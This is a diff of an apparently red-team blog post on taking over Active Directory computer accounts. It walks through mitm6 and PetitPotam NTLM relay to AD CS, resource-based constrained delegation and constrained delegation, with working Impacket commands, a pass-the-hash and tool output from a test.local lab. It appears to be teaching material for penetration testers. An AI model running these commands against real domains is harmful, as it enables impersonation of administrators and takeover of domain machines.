-<p><strong>Tools</strong>       : <em>Rubeus,Mimikatz,Impacket,..</em></p>
+<p><strong>Prerequisite</strong> : <em>Vary depending on the chosen method</em></p>
+<p><strong>Tools</strong>         : <em><a href="https://github.com/topotam/PetitPotam">PetitPotam</a>, <a href="https://github.com/cube0x0/CVE-2021-1675">PrintSpooler</a>,<a href="https://github.com/dirkjanm/mitm6">mimt6</a>,<a href="https://github.com/lgandx/Responder">responder</a>, <a href="https://github.com/Kevin-Robertson/Powermad">ADIDNS Wildcard</a> ..</em></p>
 <hr>
+<p>There is several ways out there to be in position to perform a ntlm relay authentication (Ex : ADIDNS wildcard, Print Spooler, PetitPotam, mitm6 &hellip;).</p>
+<p>The first popular method that we will go through is the <strong>mitm6</strong>. First we need to spin up a <strong>ipv6</strong> dhcp (e.g :<em>mitm6</em>) which will assign an ipv6 to our target (this may take a while):</p>
+<p><img src="/img/mitm6.png" alt="mitm6"></p>
+<p>Once done we should be able to relay some NTLM over HTTP to the service of our choice (ex : Share,LDAP,AD CS ..).</p>
+<p>We will perform a simple delegation to our owned computer account (<strong>userAddedComputerAccount</strong>) :</p>
+<p><img src="/img/ntlmrelayx_delegate.png" alt="ntlmrelayx"></p>
+<p>From that point we can perform a classic RBCD in order to own that computer ! (see below)</p>
+<p>A second popular method at the time of writing would be to use the famous <strong>PetitPotam</strong> authentication coercition (LSARPC) and relay it to an AD CS (ex : <a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2">ESC1</a>).</p>
+<pre tabindex="0"><code># You&#39;ll have to adapt your targeted template depending on what certificate template are published on your network
+sudo python3 ntlmrelayx.py -t http://192.168.1.29/certsrv/certfnsh.asp -smb2support --adcs --template Computer
+</code></pre><p><img src="/img/petitpotam.png" alt="PetitPotam"></p>
+<p>If everything is working fine, you should be granted with the targeted certificate :</p>
+<pre tabindex="0"><code>Impacket v0.9.24.dev1+20211022.182843.4229481c - Copyright 2021 SecureAuth Corporation
+
+[*] Protocol Client DCSYNC loaded..
+[...]
+[*] Setting up WCF Server
+
+[*] Servers started, waiting for connections
+[*] SMBD-Thread-4: Connection from TEST/WKS1$@192.168.1.70 controlled, attacking target http://192.168.1.35
+[*] HTTP server returned error code 200, treating as a successful login
+[*] Authenticating against http://192.168.1.35 as TEST/WKS1$ SUCCEED
+[*] SMBD-Thread-4: Connection from TEST/WKS1$@192.168.1.70 controlled, attacking target http://192.168.1.35
+[*] HTTP server returned error code 200, treating as a successful login
+[*] Authenticating against http://192.168.1.35 as TEST/WKS1$ SUCCEED
+[*] SMBD-Thread-4: Connection from TEST/WKS1$@192.168.1.70 controlled, attacking target http://192.168.1.35
+[*] HTTP server returned error code 200, treating as a successful login
+[*] Authenticating against http://192.168.1.35 as TEST/WKS1$ SUCCEED
+[*] SMBD-Thread-4: Connection from TEST/WKS1$@192.168.1.70 controlled, attacking target http://192.168.1.35
+[*] HTTP server returned error code 200, treating as a successful login
+[*] Authenticating against http://192.168.1.35 as TEST/WKS1$ SUCCEED
+[*] SMBD-Thread-4: Connection from TEST/WKS1$@192.168.1.70 controlled, attacking target http://192.168.1.35
+[*] HTTP server returned error code 200, treating as a successful login
+[*] Authenticating against http://192.168.1.35 as TEST/WKS1$ SUCCEED
+[*] Generating CSR...
+[*] CSR generated!
+[*] Getting certificate...
+[...]
+[*] GOT CERTIFICATE !
+[*] Base64 certificate of user WKS1$:
+......
+</code></pre><p>From that point onward, you can use that certificate to authenticate against <strong>LDAPS</strong> or go through the <strong>Kerberos PKINIT</strong> process to retrieve the NT hash and forge a <em>Silver Ticket</em></p>
+<p><strong>Note</strong> : You can also check that your target has the <strong>WebDav</strong> service running with <a href="https://github.com/Hackndo/WebclientServiceScanner">webdavscanner</a>. If so, you&rsquo;ll be able to use PetitPotam to have a WebDav + NTLM package to relay to the target of your choice (WebDav == No signing)</p>
+<p><strong>Note 2</strong> : PetitPotam may still be exploitable in the wild for a little longer than expected : <a href="https://twitter.com/raphajohnsec/status/1524088436809940995">https://twitter.com/raphajohnsec/status/1524088436809940995</a></p>
+<h2 id="27-resource-based-constrained-delegation">2.7 Resource Based Constrained Delegation</h2>
+<hr>
+<p><strong>Prerequisite</strong> : <em>One machine account AND
+GenericAll,AlowedToAct,WriteAllowedToAct<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></em></p>
+<p><strong>Tools</strong>         : <em>RSAT,PowerMad,Standin,Impacket,..</em></p>
+<hr>
+<p>Most of the time when you&rsquo;ll encounter a <em>RBCD</em> path in the wild it will be exploitable through the <strong>GeneriAll/GenericWrite</strong> or <strong>AllowedToAct</strong> privilege to a computer object. We won&rsquo;t go to deep in the details here,but please note that this attack does require that you own
+a computer account. Most of the time i&rsquo;ll be one of those three cases that we saw :</p>
+<ul>
+<li>Add a computer account through the ms-DS-MachineQuota privilege.</li>
+<li>Perform a privilege escalation on your current workstation/server to own the computer account.</li>
+<li>NTLM relay through some authentication coercition (ex: PetitPotam or PrintSpooler) or other less prevalent means (ex : &ldquo;Exploit&rdquo; a specific app by changing some configuration files, Wildcard on ADiDns, ..).</li>
+</ul>
+<p>The <em>msDS-AllowedToActOnBehalfOfOtherIdentity</em> attribute is the heart of the resource-based delegation attack.
+Indeed to quickly summarize the RBCD : Each resource written within this LDAP attribute will be allowed to impersonate any user on this computer.</p>
+<p>Let&rsquo;s exploit the following path where we have the <em>GenericWrite</em> right on the <em>VulnerableRBCDWKS</em> such as below :</p>
+<p><img src="/img/genericwrite.png" alt="RBCD"></p>
+<pre tabindex="0"><code># 1. Create the computer account
+addcomputer.py -dc-ip 192.168.1.66 test.local/user:Password1
+Impacket v0.9.24.dev1+20211022.182843.4229481c - Copyright 2021 SecureAuth Corporation
+
+[*] Successfully added machine account DESKTOP-RC2Q4TMN$ with password Uz49H1uBMBhwHxF04PDenbaDc1z0rvav.
+</code></pre><pre tabindex="0"><code># 2. Populate the property msDS-AllowedToActOnBehalfOfOtherIdentity
+</code></pre><p><img src="/img/rbcd_user.png" alt="rbcd"></p>
+<pre tabindex="0"><code># 3. Obtain a Service Ticket through S4U2Proxy &amp; S24U2Self
+getST.py -spn cifs/cs.test.local -dc-ip 192.168.1.66 -impersonate Administrator TEST.LOCAL/MALICIOUS$:Password20
+Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
+
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*]     Requesting S4U2self
+[*]     Requesting S4U2Proxy
+[*] Saving ticket in Administrator.ccache
+
+export KRB5CCNAME=Administrator.ccache
+</code></pre><p>We can now access the <strong>cs.test.local</strong> server by usurpating the user <strong>Administrator</strong> !</p>
+<p><img src="/img/rbcd_list_share.png" alt="C$"></p>
+<p><em>Note : If you have a KRB_AP_ERR_SKEW you should run <strong>ntpdate</strong> against the DC to fix your clock skew</em></p>
+<p>Another common use case will be to relay a computer authentication (through coercion) packet to write the property <strong>AllowedToActOnBehalfOfOtherIdentity</strong>.</p>
+<p>Please note that due to the <strong>SMB signing</strong> most likely being enforced you will have to find a way to relay a communication without any signing (ex: <strong>WebDav</strong>)</p>
+<p><em>Update 16/05 : Tiraniddo posted a <a href="https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html">fantastic blog post</a> to perform an RBCD attack using a user account instead of a computer account.</em></p>
+<h2 id="28-contrained-delegation">2.8 Contrained delegation</h2>
+<hr>
+<p><strong>Prerequisites</strong> : <em>Populated msDS-AllowedToDeletaTo OR right to write this LDAP attribute <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></em></p>
+<p><strong>Tools</strong>         : <em>Rubeus,Impacket,Kekeo, ..</em></p>
+<hr>
+<p>Our last case will be the <strong>Constrained Delegation</strong>. When you are in control of a computer account to which some constrained delegation has been performed, you will be able to exploit it and take control of the target.</p>
+<p>Let&rsquo;s take the following example where <strong>SRV1</strong> have some constrained delegation enforced to the <strong>CS</strong> server :</p>
+<pre tabindex="0"><code>ldapsearch -H ldap://192.168.1.66 -x -W -D &#34;administrator@test.local&#34; -b &#34;dc=test,dc=local&#34; &#34;(msDS-AllowedToDelegateTo=*)&#34;
+dn: CN=SRV1,CN=Computers,DC=test,DC=local
+[...]
+objectCategory: CN=Computer,CN=Schema,CN=Configuration,DC=test,DC=local
+isCriticalSystemObject: FALSE
+dSCorePropagationData: 16010101000000.0Z
+msDS-AllowedToDelegateTo: HOST/cs.test.local
+msDS-AllowedToDelegateTo: HOST/CS
+msDS-AllowedToDelegateTo: cifs/cs.test.local
+msDS-AllowedToDelegateTo: cifs/CS
+</code></pre><p>Through some privilege escalation on the <strong>WKS1</strong> you&rsquo;ve been able to retrieve the <strong>NT hash</strong> or the <strong>password</strong> of the computer account (ex: LSASS Dump, SAM dump, ..).</p>
+<p>We are now in position to exploit this delegation by getting an ST through the <strong>S4u2Proxy</strong> :</p>
+<pre tabindex="0"><code>getST.py -spn cifs/cs.test.local -impersonate ownerwks1 TEST.LOCAL/SRV1\$ -hashes :885896e95ad95ad21d3435f08a68f684
+Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
+
+[*] Getting TGT for user
+[*] Impersonating ownerwks1
+[*]     Requesting S4U2self
+[*]     Requesting S4U2Proxy
+[*] Saving ticket in ownerwks1.ccache
+
+export KRB5CCNAME=ownerwks1.ccache
+
+smbclient.py -k -no-pass cs.test.local
+Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
+
+Type help for list of commands
+# use C$
+# ls
+drw-rw-rw-          0  Wed May 18 11:38:53 2022 $Recycle.Bin
+-rw-rw-rw-     389332  Wed May 18 21:25:12 2022 bootmgr
+-rw-rw-rw-          1  Wed May 18 21:25:12 2022 BOOTNXT
+drw-rw-rw-          0  Wed May 18 11:29:25 2022 Documents and Settings
+drw-rw-rw-          0  Wed May 18 11:40:33 2022 inetpub
+-rw-rw-rw- 1476395008  Wed May 18 11:38:10 2022 pagefile.sys
+drw-rw-rw-          0  Wed May 18 21:27:34 2022 PerfLogs
+drw-rw-rw-          0  Wed May 18 21:27:34 2022 Program Files
+drw-rw-rw-          0  Wed May 18 21:27:34 2022 Program Files (x86)
+drw-rw-rw-          0  Wed May 18 22:09:18 2022 ProgramData
+drw-rw-rw-          0  Wed May 18 11:29:30 2022 Recovery
+drw-rw-rw-          0  Wed May 18 20:28:37 2022 System Volume Information
+drw-rw-rw-          0  Wed May 18 11:41:13 2022 Users
+drw-rw-rw-          0  Wed May 18 12:00:52 2022 Windows
+#
+</code></pre><p><em>Note : Obviously you have to impersonate a privileged account on the targeted server to access the administrative share. Here we knew that</em> <strong>ownerwks1</strong> <em>was part of the local</em> <strong>Administrators</strong> <em>group.</em></p>
+<h1 id="3-resources">3. Resources</h1>
+<p><a href="https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/">https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/</a>
+<a href="https://www.thehacker.recipes/ad/movement/kerberos/spn-jacking">https://www.thehacker.recipes/ad/movement/kerberos/spn-jacking</a>
+<a href="https://securityboulevard.com/2022/02/spn-jacking-an-edge-case-in-writespn-abuse/">https://securityboulevard.com/2022/02/spn-jacking-an-edge-case-in-writespn-abuse/</a>
+<a href="https://www.secureauth.com/blog/kerberos-delegation-spns-and-more/">https://www.secureauth.com/blog/kerberos-delegation-spns-and-more/</a>
+<a href="https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/service-accounts-computer">https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/service-accounts-computer</a></p>
 <section class="footnotes" role="doc-endnotes">
 <hr>
 <ol>
 <li id="fn:1" role="doc-endnote">
 <p>We will skip the the edge that allow you to do it indirectly : Owner,WriteOwner,WriteDACL&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:2" role="doc-endnote">
+<p>My go-to will be to use the <a href="https://github.com/leechristensen/Random/blob/master/PowerShellScripts/Get-LdapCurrentUser.ps1">this</a> powershell script to first check that our generated certificate is indeed working.&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
 </li>
 </ol>
 </section>
@@ -294,25 +587,14 @@ Tools : RSAT,PowerMad,Standin,Impacket,..
     <div id="toc-footer" style="display: none">
       <nav id="TableOfContents">
   <ul>
-    <li><a href="#21-authentication">2.1 Authentication</a></li>
-    <li><a href="#22-computer-account-password-update">2.2 Computer account password update</a></li>
-  </ul>
-
-  <ul>
     <li><a href="#21-add-computer-account">2.1 Add computer account</a></li>
-    <li><a href="#22-graph-attack">2.2 Graph attack</a>
-      <ul>
-        <li><a href="#22-resource-based-constrained-delegation">2.2 Resource Based Constrained Delegation</a></li>
-        <li><a href="#23-read-laps-attribute">2.3 Read LAPS Attribute</a></li>
-      </ul>
-    </li>
-    <li><a href="#24-shadow-credentials">#2.4 Shadow Credentials</a></li>
-    <li><a href="#25-change-computer-account-password">2.5 Change computer account password</a></li>
-    <li><a href="#26-password-spraying">2.6 Password spraying</a></li>
-  </ul>
-
-  <ul>
-    <li><a href="#31-silver-ticket">3.1 Silver ticket</a></li>
+    <li><a href="#22-read-laps-attribute">2.2 Read LAPS Attribute</a></li>
+    <li><a href="#23-shadow-credentials">#2.3 Shadow Credentials</a></li>
+    <li><a href="#24-force-change-computer-account-password">2.4 Force Change computer account password</a></li>
+    <li><a href="#25-password-spraying">2.5 Password spraying</a></li>
+    <li><a href="#26-ntlm-relay-machine-account">2.6 NTLM Relay machine account</a></li>
+    <li><a href="#27-resource-based-constrained-delegation">2.7 Resource Based Constrained Delegation</a></li>
+    <li><a href="#28-contrained-delegation">2.8 Contrained delegation</a></li>
   </ul>
 </nav>
     </div>
@@ -332,42 +614,42 @@ Tools : RSAT,PowerMad,Standin,Impacket,..
     </a>
   </li>
   <li>
-    <a class="icon" href="https://twitter.com/share?url=%2fposts%2fcomputerobject%2f&text=The%20differents%20takeover%20methods%20over%20ComputerObject" aria-label="Twitter">
+    <a class="icon" href="https://twitter.com/share?url=%2fposts%2fcomputerobject%2f&text=Primitives%20to%20take%20over%20ComputerObject" aria-label="Twitter">
       <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.linkedin.com/shareArticle?url=%2fposts%2fcomputerobject%2f&title=The%20differents%20takeover%20methods%20over%20ComputerObject" aria-label="Linkedin">
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=%2fposts%2fcomputerobject%2f&title=Primitives%20to%20take%20over%20ComputerObject" aria-label="Linkedin">
       <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=%2fposts%2fcomputerobject%2f&is_video=false&description=The%20differents%20takeover%20methods%20over%20ComputerObject" aria-label="Pinterest">
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=%2fposts%2fcomputerobject%2f&is_video=false&description=Primitives%20to%20take%20over%20ComputerObject" aria-label="Pinterest">
       <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="mailto:?subject=The%20differents%20takeover%20methods%20over%20ComputerObject&body=Check out this article: %2fposts%2fcomputerobject%2f" aria-label="Email">
+    <a class="icon" href="mailto:?subject=Primitives%20to%20take%20over%20ComputerObject&body=Check out this article: %2fposts%2fcomputerobject%2f" aria-label="Email">
       <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://getpocket.com/save?url=%2fposts%2fcomputerobject%2f&title=The%20differents%20takeover%20methods%20over%20ComputerObject" aria-label="Pocket">
+    <a class="icon" href="https://getpocket.com/save?url=%2fposts%2fcomputerobject%2f&title=Primitives%20to%20take%20over%20ComputerObject" aria-label="Pocket">
       <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://reddit.com/submit?url=%2fposts%2fcomputerobject%2f&title=The%20differents%20takeover%20methods%20over%20ComputerObject" aria-label="reddit">
+    <a class="icon" href="http://reddit.com/submit?url=%2fposts%2fcomputerobject%2f&title=Primitives%20to%20take%20over%20ComputerObject" aria-label="reddit">
       <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=%2fposts%2fcomputerobject%2f&name=The%20differents%20takeover%20methods%20over%20ComputerObject&description=0.%20Active%20Directory%20Computer%20Object%20%3a%20A%20brief%20overview%201.%20Computer%20account%20authentication%20101%202.1%20Authentication%202.2%20Computer%20account%20password%20update%202.%20Different%20exploitable%20path%20to%20computer%20account%202.1%20Add%20computer%20account%20%20Pre-requisite%20%3a%20MS-DS-Machine-Account-Quota%20%26gt%3b%200%20for%20domain%20users%2fauthenticated%20users%0aTools%20%3a%20RSAT%2cPowerMad%2cStandin%2cImpacket%2c..%0a%202.2%20Graph%20attack%202.2%20Resource%20Based%20Constrained%20Delegation%20%20Pre-requisite%20%3a%20One%20machine%20account%20AND%20GenericAll1%0aTools%20%3a%20RSAT%2cPowerMad%2cStandin%2cImpacket%2c..%0a%202.3%20Read%20LAPS%20Attribute%20%20Pre-requisite%20%3a%20ExtendedAllRights%20on%20the%20Computer%20Account" aria-label="Tumblr">
+    <a class="icon" href="http://www.tumblr.com/share/link?url=%2fposts%2fcomputerobject%2f&name=Primitives%20to%20take%20over%20ComputerObject&description=1.%20Active%20Directory%20Computer%20Object%20%3a%20A%20brief%20overview%20The%20computer%20account%20is%20a%20Security%20Principal%20which%20is%20a%20key%20part%20of%20the%20Active%20Directory%20Services.%20Each%20computer%20or%20server%20which%20is%20joined%20to%20the%20domain%20has%20his%20own%20computer%20account%2c%20which%20is%20essentials%20for%20many%20tasks%20suchs%20as%20%3a%0a%20Establish%20a%20secure%20channel%20for%20the%20user%20authentication%20Deploy%20a%20GPO%20tied%20to%20a%20computer%20and%20not%20a%20user%20Identify%20the%20computer%20as%20a%20workstation%2c%20server%20or%20domain%20controller%20Used%20to%20access%20network%20resources%20as%20a%20low-privileged%20account%20Unrestricted%20access%20to%20the%20resources%20on%20the%20local%20machine%20%26hellip%3b%20%20One%20thing%20to%20keep%20in%20mind%20%3a%20the%20password%20management%20of%20the%20computer%20account%20is%20delegated%20to%20the%20Active%20Directory%20which%20renders%20password%20spraying%20or%20Kerberoasting%20useless%20in%20most%20cases." aria-label="Tumblr">
       <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://news.ycombinator.com/submitlink?u=%2fposts%2fcomputerobject%2f&t=The%20differents%20takeover%20methods%20over%20ComputerObject" aria-label="Hacker News">
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=%2fposts%2fcomputerobject%2f&t=Primitives%20to%20take%20over%20ComputerObject" aria-label="Hacker News">
       <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
     </a>
   </li>
